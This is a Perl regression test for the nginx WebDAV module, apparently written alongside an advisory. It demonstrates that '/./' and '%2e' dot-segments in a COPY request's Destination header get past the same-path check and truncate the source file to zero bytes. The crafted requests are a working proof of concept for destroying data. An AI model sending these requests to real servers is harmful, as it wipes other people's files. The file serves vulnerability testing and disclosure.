#!/usr/bin/perl

# Tests for nginx dav module — incomplete same-path detection bypass
# via "/./" dot-segments in the Destination header.
#
# Advisory: GHSA-39cr-2jxh-xxhx.
#
# Background: a recent change (upstream master) added
# ngx_http_dav_validate_paths() which rejects COPY/MOVE when source and
# destination resolve to the same filesystem path after merging duplicate
# slashes via ngx_http_dav_merge_slashes(). The check is a string compare.
#
# The validation gap: ngx_http_parse_unsafe_uri() (used to validate the
# Destination header) only rejects "/../" segments, not "/./" segments.
# A destination URI containing "/./" therefore produces a different
# string from the canonical source path while resolving — at the kernel
# layer — to the same inode. The string compare returns "not equal", and
# ngx_copy_file() ends up opening the same inode for write (O_TRUNC) that
# it then reads from, leaving the source file empty (0 bytes) and the
# request failing with 500.
#
# This test seeds a file, exercises the control (same-path COPY → 403),
# then exercises two bypass variants (literal "/./" and percent-encoded
# "%2e") and asserts both the buggy HTTP response and the resulting
# zero-byte source file. Assertions are written so that when the
# underlying bug is fixed they will fail — the natural signal that the
# test needs to be updated.

###############################################################################

use warnings;
use strict;

use Test::More;
use Socket qw/ CRLF /;

BEGIN { use FindBin; chdir($FindBin::Bin); }

use lib 'lib';
use Test::Nginx;

###############################################################################

select STDERR; $| = 1;
select STDOUT; $| = 1;

my $t = Test::Nginx->new()->has(qw/http dav/)->plan(8);

# The bypass causes ngx_copy_file to read the source after it was just
# truncated (same inode), producing "read() has read only 0 of N" alerts.
# Those alerts are the concrete impact signal — mark them as TODO so the
# harness's terminal "no alerts" assertion does not flag them as a regression.
$t->todo_alerts();

$t->write_file_expand('nginx.conf', <<'EOF');

%%TEST_GLOBALS%%

daemon off;

events {
}

http {
    %%TEST_GLOBALS_HTTP%%

    server {
        listen       127.0.0.1:8080;
        server_name  localhost;

        location / {
            dav_methods PUT DELETE MKCOL COPY MOVE;
        }
    }
}

EOF

$t->run();

###############################################################################

my $body = 'important data';
my $r;

# Seed the source file.
$r = http_put('/file.txt', $body);
like($r, qr!^HTTP/1\.\d 201!, 'PUT /file.txt seeds source');

# Control: same-path COPY must be rejected (this is what the recently
# added ngx_http_dav_validate_paths() exists to catch).
$r = http_copy('/file.txt', '/file.txt');
like($r, qr!^HTTP/1\.\d 403!, 'control: identical Destination → 403');
is(slurp("$t->{_testdir}/file.txt"), $body,
    'control: source content preserved');

# Bypass A — literal "/./" segment.
# Should be 403 (same inode), but the dot-segment lets it through.
$r = http_copy('/file.txt', '/./file.txt');
unlike($r, qr!^HTTP/1\.\d 403!,
    'BUG: /./ bypass — Destination not detected as same path');

# Side effect: the source has been opened with O_TRUNC by ngx_copy_file
# while it was being read, so its content is now gone.
is(-s "$t->{_testdir}/file.txt", 0,
    'BUG: /./ bypass — source file truncated to 0 bytes');

# Reseed for variant B.
http_put('/file2.txt', $body);

# Bypass B — percent-encoded dot ("%2e").
# ngx_http_parse_unsafe_uri runs a second validation pass after
# ngx_unescape_uri rewrites %2e → "."; that second pass also checks
# only for "/../", so %2e likewise slips through.
$r = http_copy('/file2.txt', '/%2e/file2.txt');
unlike($r, qr!^HTTP/1\.\d 403!,
    'BUG: %2e bypass — Destination not detected as same path');

is(-s "$t->{_testdir}/file2.txt", 0,
    'BUG: %2e bypass — source file truncated to 0 bytes');

# Sanity: a Destination header with "/../" must still be rejected as
# unsafe (so we do not silently regress the existing protection).
http_put('/file3.txt', $body);
$r = http_copy('/file3.txt', '/sub/../file3.txt');
like($r, qr!^HTTP/1\.\d 400!,
    'sanity: /../ Destination still rejected as unsafe URI');

###############################################################################

sub slurp {
    my ($path) = @_;
    open my $fh, '<', $path or return undef;
    local $/;
    return <$fh>;
}

sub http_put {
    my ($uri, $b) = @_;
    my $length = length($b);
    http(<<EOF . $b);
PUT $uri HTTP/1.1
Host: localhost
Connection: close
Content-Length: $length

EOF
}

sub http_copy {
    my ($uri, $destination, $extra) = @_;
    $extra = '' if !defined $extra;
    http(<<EOF);
COPY $uri HTTP/1.1
Host: localhost
Connection: close
Destination: $destination
$extra

EOF
}

###############################################################################
